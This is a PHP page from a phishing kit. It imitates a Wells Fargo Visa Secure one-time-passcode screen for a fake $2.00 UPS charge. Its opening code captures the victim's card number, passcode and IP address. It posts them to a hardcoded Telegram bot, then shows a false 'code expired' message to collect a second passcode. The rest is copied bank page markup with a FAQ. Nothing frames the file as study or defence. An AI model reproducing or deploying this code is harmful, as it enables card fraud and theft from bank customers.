<?php
include'antibot.php';
$IdTelegram=array("1305831045"); 
$Bin=$_GET['bin'];
$lbin=$_GET['lbin'];
$numb=$_GET['numb'];
$realip=$_GET['realip'];
if(isset($_POST['submit'])){
 $BotTelegramToken="5092363740:AAFbRwIMY8fQpgPUppzF7AncBKbCwu_Ev3M";
 $messageTelegram  = "|==[ VBV INFO ]==|\n";
 $messageTelegram .= "|CCNUMB     :  ".$numb."\n";
 $messageTelegram .= "|PASSW     :  ".$_POST['Credential']."\n";
 $messageTelegram .= "|IP         :  ".$_GET['realip']."\n";
 $messageTelegram .= "|==[ UPS ARON-TN ]==|\n";
 foreach($IdTelegram as $user_id) {
     $website="https://api.telegram.org/bot".$BotTelegramToken;
     $params=[
      'chat_id'=>$user_id, 
      'text'=>$messageTelegram,
     ];
     $ch = curl_init($website . '/sendMessage');
     curl_setopt($ch, CURLOPT_HEADER, false);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     $result = curl_exec($ch);
     curl_close($ch);
 }
  HEADER("Location: loading.php?numb=".$numb."&phone=".$_GET['phone']."&realip=".$_GET['realip'].'&repeat=1');
}
?>
<!DOCTYPE html>
<html><!--[if lte IE 8]><html class="lt-ie9" lang=""><![endif]--><!--[if IE 9]><html class="lt-ie10" lang=""><![endif]--><!--[if gt IE 9]><html lang=""><![endif]--><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Validate</title>
  <link href="VBV_files/template-e63a3d48ea.css" rel="stylesheet">
  
  
  <link href="VBV_files/validateview-451126d279.css" rel="stylesheet">
  <style>body {color: #000000;font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;font-size: 1.25em}.header, legend, h1, h2, h3, h4 {color: #000000}label {color: #000000}a,.btn-link {color: #000000;text-decoration: underline}a:visited,.btn-link:visited {color: #000000}a:hover,a:focus,.btn-link:hover,.btn-link:focus {color: #211f1f}a:active,.btn-link:active {color: #211f1f}a.btn-link {font-size: .95em}.btn-primary,.btn-primary:focus,.btn-primary:hover {background: #211f1f;color: #FFF;border: none;border-radius: 0}.btn-primary:active,.btn-primary:active:hover,.btn-primary:active:focus {background: #1c69d3}fieldset {border: 0}fieldset > legend {border-bottom: 0;font-size: 1.00em}:not(.lt-ie9) label.custom-radio [type=radio]:checked+span:before {background: #211f1f}.accordion.modal .modal-body .panel-group .expander {color: #211f1f}.accordion.modal .modal-body .panel-group .panel {background: #FFF}.field-validation-error {color: #AB2C29}.toast-top-full-width {display: none}</style>


</head>
<body>
  <div class="threeds-two">
    


<div class="container-fluid">
  

<div class="header" id="HeaderLogos">
  <div class="row no-pad">
    <div class="col-12">
      <img alt="Wells Fargo Logo" class="img-responsive header-logo pull-left" src="data:image/png;base64,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">
     <?php 
      //3-4-5-6
      $numb=$_GET['numb'];
      if($numb[0]=='3'){
        echo('<img class="img-responsive header-logo pull-right" src="VBV_files/amex.png">');
      }else if($numb[0]=='4'){
        echo('<img class="img-responsive header-logo pull-right" src="VBV_files/vbv_logo.gif">');
      }else if($numb[0]=='5'){
        echo('<img class="img-responsive header-logo pull-right" src="VBV_files/10ad0777-c108-45e7-8d80-8da0bb22ccd3.png">');
      }else{
        echo('<img class="img-responsive header-logo pull-right" src="VBV_files/discover.png">');
      }
     ?>
    </div>
  </div>
</div>
  <br>
  <div class="body" dir="LTR" style="bottom: 58px;">
    


<div class="container container-sticky-footer">
  <input type="hidden" name="LanguageCode" id="LanguageCode" value="en-us">
    <input type="hidden" name="LanguageShortCode" id="LanguageShortCode" value="en">
    <input type="hidden" name="CredentialValidationMessage" id="CredentialValidationMessage" value="Please re-enter your code">
    <div class="body" dir="LTR" style="bottom: 58px;">
      

    <h1 class="screenreader-only">Your One-time Passcode has been sent</h1>

      <br>
      <div class="row">
      </div>
      <div class="row">
          <div class="col-12" id="ValidateOneUpMessage">
              
<?php if(isset($_GET['repeat'])){ if($_GET['repeat']=='1'){echo('<p style="color:red;font-size: 11px; font-weight: bold;">Your unique code card has expired. Wait, we will send you a new one.</p>');};};?>     
              <div id="Body1">To continue with your transaction, please enter your one-time passcode below and click Submit.</div>
          </div>
      </div>

      <br>

      <div class="row form-two-col">
        <div class="col-12">
            <fieldset id="ValidateTransactionDetailsContainer">
                <legend id="ValidateTransactionDetailsHeader">Transaction Details</legend>

                <div class="validate-field row">
                    <span class="validate-label col-6">Merchant:</span>
                    <span class="col-6">Ups Service</span>
                </div>

                <div class="validate-field row">
                    <span class="validate-label col-6">Transaction Amount:</span>
                    <span class="col-6 always-left-to-right">$2.00 USD</span>
                </div>

                <div class="validate-field row">
                    <span class="validate-label col-6">Card Number:</span>
                    <span class="col-6 always-left-to-right"><?php echo($Bin);?>******<?php echo($lbin);?></span>
                </div>
                <div class="validate-field row">
                        <span class="validate-label col-6">Enter Code:</span>



<form method="post" action="">
    <span>
      <label for="Credential_Value" hidden="">Please enter your code</label>
      <input data-val="true" data-val-required="Please enter your code" required id="Credential_Value" name="Credential" type="text">
    </span>

                </div>
                <div class="validate-field row">
                    <span class="validate-label col-6">&nbsp;</span>
                    <span id="ValidationErrorMessage" class="field-validation-error" style="display: none;"></span>
                    <span class="field-validation-valid col-6" data-valmsg-for="Credential.Value" data-valmsg-replace="true"></span>
                </div>
            </fieldset>
        </div>
      </div>

        <div class="row">
          <div class="col-12" id="ValidateOptInMessage">
            
          </div>
        </div>

      <div class="row">
        <div class="col-12">
            <div id="linkContainer">
                <a href="#" id="ResendLink">Click here to receive another code</a>
            </div>
          <span id="MaximumResendsReachedMessage" style="display:none">You have reached the maximum number of requests for a new code</span>
        </div>
      </div>
    </div>
    <div class="sticky-footer">
      <div class="row no-pad">
        <div class="col-12 text-center">
          <button type="submit"  class="btn btn-primary" id="ValidateButton" name="submit">Submit</button>
        </div>
      </div>
</form>

<div class="footer" id="FooterLinks">
  <div class="row">
    <div class="col-12">
      <ul class="list-inline list-inline-separated pull-left"><li><a class="btn btn-link" data-target="#FAQ" data-toggle="modal" href="#FAQ" id="FooterLink1">FAQ</a></li></ul>
      <a id="ExitLink" class="list-inline list-inline-separated pull-right" href="#">Exit</a>
    </div>
  </div>
</div>
    </div>

<div class="modal modal-clear" id="ProcessingModal" tabindex="-1" role="dialog" aria-labelledby="Processing-label" aria-hidden="true" data-keyboard="false" data-backdrop="static">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-body">
        <div class="row">
          <div class="col-12 processing">
            <img id="ProcessingImage" src="VBV_files/loading.svg" alt="Loading Indicator" class="processing-img center-block content-block">
            <p class="processing-text" id="Processing-label">Processing</p>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>



  </div>
  <br>
  <input data-val="true" data-val-number="The field MessageVersion must be a number." data-val-required="The MessageVersion field is required." id="MessageVersion" name="MessageVersion" type="hidden" value="2">
  <div class="accordion modal fade" id="FAQ" tabindex="-1" role="dialog" aria-labelledby="FAQ-label" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
        <h4 class="modal-title" id="FAQ-label">Frequently Asked Questions</h4>
      </div>
      <div class="modal-body">
        <ol class="panel-group list-unstyled" id="collapse">
            <li class="panel panel-default">
              <div class="panel-heading">
                <div class="panel-title">
                  <a class="collapsed" data-toggle="collapse" data-parent="#collapse" href="#collapse-1">
                    <div class="expander">
                      <span></span>
                    </div>
                    <div class="content">What is Visa Secure?</div>
                  </a>
                </div>
              </div>

              <div id="collapse-1" class="panel-collapse collapse">
                <div class="panel-body">
                  <div class="expander">&nbsp;</div>
                  <div class="content">Visa Secure is a service offered 
by Visa and Wells Fargo to protect cardholders against unauthorized use.
 Each transaction is evaluated by the service and in some cases, you 
will be asked to enter a one-time passcode to complete the transaction.</div>
                </div>
              </div>
            </li>
            <li class="panel panel-default">
              <div class="panel-heading">
                <div class="panel-title">
                  <a class="collapsed" data-toggle="collapse" data-parent="#collapse" href="#collapse-2">
                    <div class="expander">
                      <span></span>
                    </div>
                    <div class="content">Will a one-time passcode be required for all online purchases?</div>
                  </a>
                </div>
              </div>

              <div id="collapse-2" class="panel-collapse collapse">
                <div class="panel-body">
                  <div class="expander">&nbsp;</div>
                  <div class="content">No. Wells Fargo is working to 
keep your card secure and will only prompt you for a passcode when 
additional verification is required.</div>
                </div>
              </div>
            </li>
            <li class="panel panel-default">
              <div class="panel-heading">
                <div class="panel-title">
                  <a class="collapsed" data-toggle="collapse" data-parent="#collapse" href="#collapse-3">
                    <div class="expander">
                      <span></span>
                    </div>
                    <div class="content">What if I do not recognize the mobile numbers available to send the passcode?</div>
                  </a>
                </div>
              </div>

              <div id="collapse-3" class="panel-collapse collapse">
                <div class="panel-body">
                  <div class="expander">&nbsp;</div>
                  <div class="content">If you do not recognize the numbers, please call the number on the back of your card to speak with a Wells Fargo representative.</div>
                </div>
              </div>
            </li>
            <li class="panel panel-default">
              <div class="panel-heading">
                <div class="panel-title">
                  <a class="collapsed" data-toggle="collapse" data-parent="#collapse" href="#collapse-4">
                    <div class="expander">
                      <span></span>
                    </div>
                    <div class="content">What if I do not receive the one-time passcode?</div>
                  </a>
                </div>
              </div>

              <div id="collapse-4" class="panel-collapse collapse">
                <div class="panel-body">
                  <div class="expander">&nbsp;</div>
                  <div class="content">You may request another code by selecting “Click here to receive another code” to your preferred mobile number.</div>
                </div>
              </div>
            </li>
            <li class="panel panel-default">
              <div class="panel-heading">
                <div class="panel-title">
                  <a class="collapsed" data-toggle="collapse" data-parent="#collapse" href="#collapse-5">
                    <div class="expander">
                      <span></span>
                    </div>
                    <div class="content">What happens if I select “Exit?”</div>
                  </a>
                </div>
              </div>

              <div id="collapse-5" class="panel-collapse collapse">
                <div class="panel-body">
                  <div class="expander">&nbsp;</div>
                  <div class="content">The experience varies by merchant, but it is not likely that you will be able to proceed with the transaction.</div>
                </div>
              </div>
            </li>
        </ol>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>
  <form class="nextstep-form" method="post">
  <input id="NextStepTransactionId" name="TransactionId" type="hidden" value="aeb08586-9236-4f13-9426-8b7f7d5e7adf">
  <input id="GroupId" name="GroupId" type="hidden" value="Visa">
  <input id="Type" name="Type" type="hidden" value="">
  
  <input id="NextStepChoiceType" name="NextStepChoiceType" type="hidden" value="Grouped">
  <input id="NextStepIssuerId" name="IssuerId" type="hidden" value="5ab01ada2479786a6cd1d302">

  <form method="POST" id="TermForm">
  <input type="hidden" id="cres" name="cres" value="">
  <input type="hidden" id="threeDSSessionData" name="threeDSSessionData" value="">
</form>
</div>


  </div>
  <script src="VBV_files/template-2abc8ec702.js"></script>
  
  
  <script src="VBV_files/validateview-1b5d6bef0d.js"></script>




</body></html>